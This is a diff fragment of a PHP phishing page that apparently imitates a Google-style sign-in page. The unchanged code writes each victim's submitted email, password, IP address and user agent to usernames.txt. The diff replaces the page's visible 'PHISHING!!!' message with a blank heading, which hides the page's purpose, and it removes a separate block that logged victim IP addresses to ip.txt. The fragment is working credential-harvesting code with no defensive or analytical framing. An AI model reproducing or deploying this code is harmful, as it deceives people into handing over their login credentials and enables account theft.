@@ -23,24 +23,8 @@ if(isset($_POST['password']) && strlen($_POST['password']) > 0){
 	$email=$_SESSION["Email"];
 	file_put_contents("usernames.txt", "[EMAIL]: " . $email . "  [PASS]: " . $pass . " [IP]: " . $ipaddress . " [USER_AGENT]: " . $_SERVER['HTTP_USER_AGENT'] ."\n", FILE_APPEND);
   session_destroy();
-  die("<h1 align='center'>PHISHING!!!</h1>");
+  die("<h1 align='center'> </h1>");
 }
-
-if(!isset($_GET['kl'])){
-  if (!empty($_SERVER['HTTP_CLIENT_IP']))
-    $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
-  elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
-    $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
-  else
-    $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
-  
-  $useragent = "User-Agent: " . $_SERVER['HTTP_USER_AGENT']."\n\n";
-  $victim = "Victim Public IP: " . $ipaddress;
-
-  file_put_contents('ip.txt', $victim.$useragent, FILE_APPEND);
-}
-if(!isset($_POST['Email']) || strlen($_POST['Email']) < 1){
-?>
 
 <!DOCTYPE html>
 <html dir="ltr" class="CMgTXc" lang="en"><head>
